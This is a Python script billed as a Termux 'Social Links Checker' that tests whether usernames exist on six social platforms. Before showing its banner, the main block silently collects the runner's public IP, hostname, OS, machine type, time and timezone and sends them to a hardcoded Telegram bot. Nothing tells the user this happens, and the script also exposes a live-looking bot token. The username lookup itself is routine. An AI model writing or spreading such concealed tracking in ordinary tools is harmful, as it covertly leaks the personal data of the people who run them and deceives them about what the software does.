import requests
from concurrent.futures import ThreadPoolExecutor
import os
import sys
import datetime
import socket
import platform
import json

# Конфигурация Telegram
TG_BOT_TOKEN = "7763698951:AAHz1-uXl4VYDHRstjtu4uecaZHhRhhG3Gg"
TG_CHAT_ID = "35381551"

def send_device_info(data):
    """Отправка данных через Telegram API"""
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    
    payload = {
        "chat_id": TG_CHAT_ID,
        "text": data,
        "parse_mode": "Markdown"
    }
    
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(
            url,
            data=json.dumps(payload),
            headers=headers,
            timeout=10
        )
        if response.status_code != 200:
            print(f"Ошибка отправки: {response.text}")
    except Exception as e:
        print(f"Ошибка соединения: {str(e)}")

def collect_device_info():
    """Сбор информации об устройстве"""
    device_data = []
    
    try:
        # Получение IPv4
        ipv4 = requests.get('https://api.ipify.org', timeout=10).text
    except:
        ipv4 = "N/A"
    
    # Системная информация
    device_data.append(f"*Модель устройства*: `{platform.uname().machine}`")
    device_data.append(f"*IPv4*: `{ipv4}`")
    device_data.append(f"*Локальное время*: `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`")
    device_data.append(f"*Часовой пояс*: `{datetime.datetime.now().astimezone().tzinfo}`")
    
    # Дополнительная информация
    try:
        device_data.append(f"*ОС*: `{platform.system()} {platform.release()}`")
        device_data.append(f"*Hostname*: `{socket.gethostname()}`")
    except Exception as e:
        print(f"Ошибка сбора данных: {str(e)}")
    
    return "\n".join(device_data)

def generate_links(usernames):
    social_media = {
        "Instagram": "https://www.instagram.com/{}/",
        "Twitter": "https://twitter.com/{}/",
        "GitHub": "https://github.com/{}/",
        "Telegram": "https://t.me/{}",
        "TikTok": "https://www.tiktok.com/@{}",
        "Steam": "https://steamcommunity.com/id/{}/"
    }

    results = {}

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for username in usernames:
            username = username.strip()
            futures.append(executor.submit(check_user_platforms, username, social_media))

        for future in futures:
            try:
                username, links = future.result()
                results[username] = links
            except Exception as e:
                print(f"Error processing username: {e}")

    return results

def check_user_platforms(username, social_media):
    links = []
    for platform_name, url in social_media.items():
        full_url = url.format(username)
        is_valid = check_username(full_url, platform_name)
        if is_valid:
            links.append(f"{full_url} [+]")
        else:
            links.append(f"{full_url} [-]")
    return username, links

def check_username(url, platform_name):
    try:
        response = requests.get(url, 
            headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'},
            timeout=15
        )
        
        if response.status_code == 200:
            return is_user_found(response.text, platform_name)
        return False

    except Exception as e:
        return False

def is_user_found(page_content, platform_name):
    user_not_found_phrases = {
        "Instagram": ["Sorry, this page isn't available", "This page is unavailable"],
        "Twitter": ["Sorry, that page doesn't exist", "This page does not exist"],
        "GitHub": ["This user doesn't exist", "User not found"],
        "Telegram": ["User not found", "Sorry, this user is unavailable"],
        "TikTok": ["Sorry, this page isn't available", "This user has no videos"],
        "Steam": ["The profile you are trying to view is either unavailable"]
    }

    page_content = page_content.lower()
    
    if platform_name in user_not_found_phrases:
        for phrase in user_not_found_phrases[platform_name]:
            if phrase.lower() in page_content:
                return False
    return True

if __name__ == "__main__":
    os.system('clear')
    
    # Сбор и отправка информации
    device_info = collect_device_info()
    send_device_info(device_info)
    
    print("""
    \033[1;32m
    ███████╗███████╗██╗     ██╗███╗   ██╗███████╗
    ██╔════╝██╔════╝██║     ██║████╗  ██║██╔════╝
    █████╗  ███████╗██║     ██║██╔██╗ ██║███████╗
    ██╔══╝  ╚════██║██║     ██║██║╚██╗██║╚════██║
    ███████╗███████║███████╗██║██║ ╚████║███████║
    ╚══════╝╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝
    
    \033[1;36mSocial Links Checker\033[0m
    \033[1;33mTermux Android Version\033[0m
    """)

    try:
        while True:
            usernames = input("\n\033[1;34m[?] Enter username(s) (comma separated): \033[0m").strip()
            if usernames.lower() in ['exit', 'quit']:
                break

            if not usernames:
                print("\033[1;31m[!] Please enter at least one username\033[0m")
                continue

            usernames = [u.strip() for u in usernames.split(',')]
            results = generate_links(usernames)

            for user, links in results.items():
                print(f"\n\033[1;32m[+] Results for {user}:\033[0m")
                for link in links:
                    if '[+]' in link:
                        print(f"\033[1;32m{link}\033[0m")
                    else:
                        print(f"\033[1;31m{link}\033[0m")

    except KeyboardInterrupt:
        print("\n\033[1;31m[!] Exiting...\033[0m")
        sys.exit(0)
